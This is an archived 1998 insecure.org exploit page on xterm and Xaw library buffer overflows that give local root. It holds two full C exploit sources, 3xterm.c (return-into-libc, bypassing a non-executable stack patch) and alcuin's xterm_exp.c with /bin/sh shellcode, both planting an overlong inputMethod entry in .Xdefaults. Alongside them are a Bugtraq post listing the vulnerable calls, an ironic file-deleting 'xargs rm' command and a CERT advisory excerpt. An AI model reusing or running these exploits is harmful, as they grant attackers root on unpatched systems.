<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0050)http://www.insecure.org/sploits/xaw.overflows.html -->
<HTML><HEAD><TITLE>Xaw and Xterm vulnerabilities</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META 
content="There are a number of vulnerabilities in X11R6 xterm(1) and Xaw(3c) libraries.  They are mostly all overflows" 
name=description>
<META 
content=" 3c, AIX, HP, IRIX, Keymap, Linux, Solaris, There, They, Those, Thus, UX, Virtually, X, X11R6, Xaw, Xterm, anyway, apps, boxes, everyone, hole, libraries, likely, linked, many, mostly, number, others, overflows, perhaps, running, specific, that, uses, versions, virtually, vulnerabilities, vulnerable, which, xterm" 
name=keywords>
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#ffffff vLink=#7f7f7f link=#0b7cff bgColor=#000000>
<TABLE cellSpacing=0 cellPadding=0 width="100%">
  <TBODY>
  <TR>
    <TD align=left><A href="http://www.insecure.org/"><IMG height=90 
      src="Xaw and Xterm vulnerabilities_files/Insecurelogo-eye-90x168.gif" 
      width=168 border=0></A> </TD>
    <TD vAlign=bottom align=right><!-- Begin Banner Code --><IFRAME 
      marginWidth=0 marginHeight=0 
      src="Xaw and Xterm vulnerabilities_files/pro.pl" frameBorder=0 width=728 
      scrolling=no 
      height=90>
<SCRIPT LANGUAGE="JavaScript"><!--
random = parseInt(Math.random()*10000)
banner = '<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;'
banner += 'page=' + random + '" >';
banner += '<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?'
banner += 'page=' + random + '" '
banner += ' ALT="Click Here!" BORDER=0></A>'
document.write(banner)
// --></SCRIPT>
<NOSCRIPT>
<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;page=01">
<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?page=01"
     ALT="Click Here!" BORDER=0></A>
</NOSCRIPT>
</IFRAME><!-- End Banner Code --></TD></TR></TBODY></TABLE>
<CENTER>
<H1><B>Xaw and Xterm vulnerabilities</B></H1></CENTER>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Summary</B></TH></TR></TBODY></TABLE>
<TABLE>
  <TBODY>
  <TR>
    <TD vAlign=top><B>Description:</B></TD>
    <TD>There are a number of vulnerabilities in X11R6 xterm(1) and Xaw(3c) 
      libraries. They are mostly all overflows</TD></TR>
  <TR>
    <TD vAlign=top><B>Author:</B></TD>
    <TD>Pavel Kankovsky &lt;peak@kerberos.troja.mff.cuni.cz&gt; and the 
      exploit was written by alcuin </TD></TR>
  <TR>
    <TD vAlign=top><B>Compromise:</B></TD>
    <TD><FONT color=#ff0000 size=+3>root </FONT>(local)</TD></TR>
  <TR>
    <TD vAlign=top><B>Vulnerable Systems:</B></TD>
    <TD>Those running Xterm or X apps linked to vulnerable Xaw. Virtually all 
      versions of X are vulnerable to the *Keymap hole and the others are mostly 
      X11R6 specific (which virtually everyone uses anyway). Thus it is likely 
      that many Solaris, Linux, HP/UX, and perhaps IRIX and AIX boxes are 
      vulnerable.</TD></TR>
  <TR>
    <TD vAlign=top><B>Date:</B></TD>
    <TD>4 May 1998</TD></TR>
  <TR>
    <TD vAlign=top><B>Notes:</B></TD>
    <TD>I have also included an exploit sent to me by "M.C.Mar" 
      &lt;emsi@it.com.pl&gt;. This exploit works against Xaw and neXtaw even 
      WITH Solar Designer's non-executable stack patch applied. Check it 
  out!</TD></TR></TBODY></TABLE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Details</B></TH></TR></TBODY></TABLE><BR>Date: Wed, 10 Jun 
1998 20:09:07 +0200 (MET DST) From: "M.C.Mar" &lt;woloszyn@nospam.it.pl&gt; 
X-Sender: woloszyn@dollar.it.com.pl<BR>Reply-To: "M.C.Mar" 
&lt;emsi@it.com.pl&gt;<BR>To: fyodor@insecure.org<BR>Subject: my 
sploit<BR>Message-ID: 
&lt;Pine.GSO.3.96.980610200850.7281v-100000@dollar.it.com.pl&gt;<BR>X-Hidden-txt: 
Screw Windoze<BR>
<P>Hi! 
<P>I developed sploit against Xaw and neXtaw which works even is Solar 
Designer's patch is applyed. 
<P>While compiling tandard sploit developed by alcuin: emsi:~/hack&gt; gcc 
xterm.c <BR>emsi:~/hack&gt; ./a.out <BR>Segmentation fault 
<P>Then as root:<BR>emsi:/home/mcmar/hack# grep overflow /var/adm/syslog -A1 Jun 
10 19:09:39 emsi kernel: Possible buffer overflow exploit attempt: Jun 10 
19:09:39 emsi kernel: Process xterm (pid 311, uid 1001, euid 0). 
<P>Now compile my sploit:<BR>emsi:~/hack&gt; gcc 3xterm.c -L /usr/X11/lib/ -lXaw 
-lXmu -lXt -lSM -lICE -lXext -lX11 -lc<BR>emsi:~/hack&gt; ./a.out <BR>bash# 
<P>Cool, izn't it? ;) 
<P>And here goes (for the eduction of curse ;) my sploit source: 
<P>emsi:~/hack&gt; cat 3xterm.c <BR>/* 
<P>A simple xploit working arround non-executable stack patch! ;) Based on Solar 
Designer's: "Getting around non-executable stack(fix)" post and:<BR>Rafa³ 
Wojtczuk's "Defeating Solar Designer'a Non-executable Stach Patch" 
<P>sploit by Kil3r of Lam3rZ against both Xaw and neXtaw widgets based on 
xterm_exp.c by alcuin 
<P>Compile it like this:<BR>gcc 3xterm.c -L /usr/X11/lib/ -lXaw -lXmu -lXt -lSM 
-lICE -lXext -lX11 -lc 
<P>Description:<BR>The sploit simply passes the EXECLP address and its 
parameters addresses onto the stack. To work fine you need to look for execlp 
Program Linkage Table entry in xterm and for "/bin/sh" string in its data 
segment... 
<P>emsi:~mcmar/hack# gdb xterm<BR>GDB is free software and you are welcome to 
distribute copies of it under certain conditions; type "show copying" to see the 
conditions. There is absolutely no warranty for GDB; type "show warranty" for 
details. GDB 4.16 (i486-slackware-linux), <BR>Copyright 1996 Free Software 
Foundation, Inc...(no debugging symbols found)...<BR>(gdb) print execlp <BR>$1 = 
{&lt;text variable, no debug info&gt;} 0x804bc78 &lt;execlp&gt; (gdb) x/s 
0x8063d2e<BR>0x8063d2e &lt;_fini+8158&gt;: "/bin/sh" 
<P>0x804bc78 and 0x8063d2e are OK for me, but you may need to look for the riht 
ones in your case... ;) 
<P>GreetZ: bulba, smierc and whole Lam3rZ teem and other Polish hackers. 
<P>*/ 
<P>#include &lt;stdlib.h&gt;<BR>#include &lt;stdio.h&gt;<BR>#include 
&lt;ctype.h&gt; 
<P>#define CONFFILE ".Xdefaults"<BR>#define OLDFILE ".Xdefaults.old"<BR>#define 
NEWFILE ".Xdefaults.new" 
<P>#define EXECLP 0x804bc78 // execlp PLT adress in xterm #define BIN_SH 
0x8063d2e // "/bin/sh" string address in xterm ;) 
<P>int *ptr; 
<P>void main(int argc, char *argv[]) { 
<P>char *home;<BR>FILE *f_in, *f_out;<BR>char buff[16384];<BR>char 
shellbuf[16384];<BR>char *s;<BR>int i; 
<P>if (home = getenv("HOME")) chdir(home); 
<P>if (!(f_out = fopen(NEWFILE, "w"))) { perror("fopen");<BR>exit(1);<BR>} 
<P>if (f_in = fopen(CONFFILE, "r")) {<BR>fseek(f_in,0,SEEK_SET);<BR>while 
(!feof(f_in)) { <PRE>      fgets(buff,16384,f_in);
      for (s=buff;isblank(*s);s++);
      if (strncmp(s,"xterm*inputMethod",17)&lt;0)
        fputs(buff,f_out);
</PRE>
<P>}<BR>fclose(f_in);<BR>} 
<P>/* fill the buffer with nops */<BR>memset(shellbuf, 0x90, sizeof(shellbuf)); 
shellbuf[sizeof(shellbuf)-1] = 0; 
<P>ptr = (int *)(shellbuf+1028);<BR>*ptr++ =EXECLP;<BR>*ptr++ =EXECLP;<BR>*ptr++ 
=BIN_SH;<BR>*ptr++ =BIN_SH;<BR>*ptr++ = 0; 
<P>fputs("xterm*inputMethod:",f_out);<BR>fputs(shellbuf, 
f_out);<BR>fclose(f_out); 
<P>system("/bin/cp "CONFFILE" "OLDFILE); system("/bin/mv -f "NEWFILE" 
"CONFFILE); 
<P>execl("/usr/X11R6/bin/xterm","xterm",NULL); } 
<HR>
M.C.Mar An NT server can be run by an idiot, and usually is. emsi@it.pl 
<P>"If you can't make it good, make it LOOK good." - Bill Gates <PRE>
Date: Mon, 4 May 1998 11:06:05 +0200
From: Pavel Kankovsky &lt;peak@kerberos.troja.mff.cuni.cz&gt;
To: BUGTRAQ@NETSPACE.ORG
Subject: Re: TOG and xterm problem

On Fri, 1 May 1998, Jeff Gehlbach wrote:

&gt; Open Group, when *will* the rest of us see at least some clues about where
&gt; the bug lies and how it can be fixed?  You say you won't release patches
&gt; to X11R&lt;6.4, but can you at least be nice enough to tell those of us using
&gt; the still-perfectly-serviceable 6.3 just a tidbit about the problem?

Believe or not, it took me 10 minutes to grep the appropriate parts of
X11R6.3 sources, following the clues mentioned in the CERT advisory, and
find the bugs--at least some of them.

xc/programs/xterm/charproc.c:
* HandleKeymapChange():

    (void) sprintf( mapName, "%sKeymap", params[0] );
    (void) strcpy( mapClass, mapName );

(actually, the second command is mostly harmless because the size of
mapName and mapClass is the same)

xc/programs/xterm/charproc.c:
* VTInitI18N():

        strcpy(tmp, term-&gt;misc.input_method);
...
            strcpy(buf, "@im=");
            strcat(buf, s);
...
    strcpy(tmp, term-&gt;misc.preedit_type);

xc/lib/Xaw/XawIm.c:
* OpenIM():

            strcpy(modifiers, "@im=");
            strcat(modifiers, ve-&gt;im.im_list[i]);

* ParseIMNameList():

    char        *s, *save_s, *ss, *list[32], **lp, *end;
...
        list[i] = s;

(This one is quite interesting.
Exercise for the reader: write an exploit.)

&lt;ironic&gt;
Security hint of the day:
        find . -name '*.[ch]' | \
        xargs egrep -l 'sprintf|strcat|strcpy' | \
        xargs rm
&lt;/ironic&gt;


--Pavel Kankovsky aka Peak  [ Boycott Microsoft--http://www.vcnet.com/bms ]


P.S. A copy of this message is being submitted to XFree86.




/*
 
  xterm_exp.c : linux/x86 xterm.Xaw exploit
  by alcuin - 5/4/98 - [ http://www.rootshell.com/ ]

  It works against both Xaw and neXtaw widgets

  NB: you have to cp ~/.Xdefaults.old ~/.Xdefaults to be able to
  use xterm again.
        
*/

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;


unsigned int getsp() {
  asm("mov %esp,%eax");
}

inline rootshell(){
  __asm__(
      "movb $0x56, %al\n\t"
      "l1:cmpb $0x12, %al\n\t"
      "je l2\n\t"
      "movb $0x12,%al\n\t"
      "call l1\n\t"
      "l2:pop %esi\n\t"
      "xorl %eax,%eax\n\t"
      "movb $0x25, %al\n\t"
      "addl %eax,%esi\n\t"
      "movl %esi,%ebx\n\t"
      "movl %esi,%edi\n\t"
      "movb $8,%al\n\t"
      "addl %eax,%edi\n\t"
      "movb $5,%al\n\t"
      "addl %eax,%esi\n\t" 
      "movl %esi,(%edi)\n\t"
      "movl %edi,%ecx\n\t"
      "incl %edi\n\t"
      "incl %edi\n\t"
      "incl %edi\n\t"
      "incl %edi\n\t"
      "xorb %al,%al\n\t"
      "movl %eax,(%edi)\n\t"
      "movl %edi,%edx\n\t"
      "movb $0xb,%al\n\t"
      "int $0x80\n\t"
      ".string \"/bin/sh\"\n"
      );
}

  
#define CONFFILE ".Xdefaults"
#define OLDFILE ".Xdefaults.old"
#define NEWFILE ".Xdefaults.new"

main (int argc, char **argv) {

  char *home;
  FILE *f_in, *f_out;
  char buf[16384];
  char shellbuf[16384];
  char *s;
  int i;
  unsigned int sp=getsp();

  if (home = getenv("HOME")) chdir(home);

  if (!(f_out = fopen(NEWFILE, "w"))) {
    perror("fopen");
    exit(1);
  }

  if (f_in = fopen(CONFFILE, "r")) {
    fseek(f_in,0,SEEK_SET);
    while (!feof(f_in)) {
      fgets(buf,16384,f_in);
      for (s=buf;isblank(*s);s++);
      if (strncmp(s,"xterm*inputMethod",17)&lt;0)
        fputs(buf,f_out);
    }
    fclose(f_in);
  }

  /* fill the buffer with nops */
  memset(shellbuf, 0x90, sizeof(shellbuf));
  shellbuf[sizeof(shellbuf)-1] = 0;

  /* write the return adress */
  s = shellbuf+2052;
  *(int *)s=sp+0x69F5;
  
  /* write the root shell code */
  s = shellbuf+2800;
  strcpy(s,(char*)rootshell);

  fputs("xterm*inputMethod:",f_out);
  fputs(shellbuf, f_out);
  fclose(f_out);

  system("/bin/cp "CONFFILE" "OLDFILE);
  system("/bin/mv -f "NEWFILE" "CONFFILE);

  execl("/usr/X11R6/bin/xterm","xterm",NULL);
}

[ From CERT advisory VB-98.04 ]

I. Description

Vulnerabilities exist in the terminal emulator xterm(1), and the Xaw
library distributed in various MIT X Consortium; X Consortium, Inc.;
and The Open Group X Project Team releases. These vulnerabilities may
be exploited by an intruder to gain root access. 

The resources and the releases affected by the xterm vulnerability are:

                              Resources
                 inputMethod       preeditType      *Keymap
    Release      
    X11R3           NO                 NO             YES
    X11R4           NO                 NO             YES
    X11R5           NO                 NO             YES
    X11R6           NO                 NO             YES
    X11R6.1         YES                YES            YES
    X11R6.2         YES                YES            YES
    X11R6.3         YES                YES            YES
    X11R6.4         YES                YES            YES

The resources and the releases affected by the Xaw library
vulnerability are

                              Resources
                 inputMethod       preeditType
    Release      
    X11R6           YES                YES
    X11R6.1         YES                YES
    X11R6.2         YES                YES
    X11R6.3         YES                YES
    X11R6.4         YES                YES


(X11R6.2 was not released to the public.)

The Open Group X Project Team has investigated the issue and recommends 
the following steps for neutralizing the exposure. It is HIGHLY RECOMMENDED
that these measures be implemented on ALL vulnerable systems. This issue 
will be corrected in future X Project Team releases of X11.
</PRE><PRE>
</PRE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>More Exploits!</B></TH></TR></TBODY></TABLE><BR>The master 
index of all exploits is available <A 
href="http://www.insecure.org/sploits_all.html">here</A> (Very large file)<BR>Or 
you can pick your favorite operating system:<BR>
<TABLE border=1>
  <TBODY>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_all.html">All OS's</A></TD>
    <TD><A href="http://www.insecure.org/sploits_linux.html">Linux</A></TD>
    <TD><A 
      href="http://www.insecure.org/sploits_solaris.html">Solaris/SunOS</A></TD>
    <TD><A 
    href="http://www.insecure.org/sploits_microshit.html">Micro$oft</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_bsd.html">*BSD</A></TD>
    <TD><A href="http://www.insecure.org/sploits_mac.html">Macintosh</A></TD>
    <TD><A href="http://www.insecure.org/sploits_aix.html">AIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_irix.html">IRIX</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_ultrix.html">ULTRIX/Digital 
      UNIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_hpux.html">HP/UX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_sco.html">SCO</A></TD>
    <TD><A href="http://www.insecure.org/sploits_remote.html">Remote 
      exploits</A></TD></TR></TBODY></TABLE><BR>This page is part of <A 
href="http://www.insecure.org/sploits.html">Fyodor's exploit world</A>. For a 
free program to automate scanning your network for vulnerable hosts and 
services, check out my network mapping tool, <A 
href="http://www.insecure.org/nmap/index.html">nmap</A>. Or try these <A 
href="http://www.insecure.org/">Insecure.Org</A> resouces:<BR><BR>
<CENTER>[ <A href="http://www.insecure.org/nmap/index.html"><FONT 
color=#ffffff>Nmap</FONT></A> | <A 
href="http://www.insecure.org/tools.html"><FONT color=#ffffff>Tools</FONT></A> | 
<A href="http://lists.insecure.org/"><FONT color=#ffffff>Lists</FONT></A> | <A 
href="http://www.insecure.org/reading.html"><FONT 
color=#ffffff>Reading</FONT></A> | <A href="http://www.insecure.org/"><FONT 
color=#ffffff>News</FONT></A> | <A 
href="http://www.insecure.org/myworld.html"><FONT 
color=#ffffff>About/Contact</FONT></A> | <A 
href="http://www.insecure.org/advertising.html"><FONT 
color=#ffffff>Advertising</FONT></A> | <A 
href="http://www.insecure.org/privacy.html"><FONT color=#ffffff>Privacy 
Policy</FONT></A> ]<BR></CENTER></BODY></HTML>
